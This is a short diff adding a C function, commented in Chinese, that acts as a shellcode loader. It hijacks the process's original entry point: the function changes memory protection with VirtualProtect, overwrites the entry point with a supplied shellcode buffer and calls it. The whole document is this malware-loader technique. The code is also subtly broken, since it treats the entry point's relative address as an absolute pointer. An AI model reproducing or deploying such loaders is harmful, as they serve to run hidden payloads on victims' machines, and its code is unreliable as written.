@@ -1,0 +1,18 @@
+// OEP劫持注入加载方式：劫持原始入口点执行
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] OEP劫持注入方式执行Shellcode\n");
+#endif
+    HMODULE hModule = GetModuleHandleA(NULL);
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+    
+    DWORD oldProtect;
+    LPVOID entryPoint = (LPVOID)ntHeaders->OptionalHeader.AddressOfEntryPoint;
+    
+    VirtualProtect(entryPoint, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(entryPoint, shellcode, shellcodeSize);
+    VirtualProtect(entryPoint, shellcodeSize, oldProtect, &oldProtect);
+    
+    ((void(*)())entryPoint)();
+}
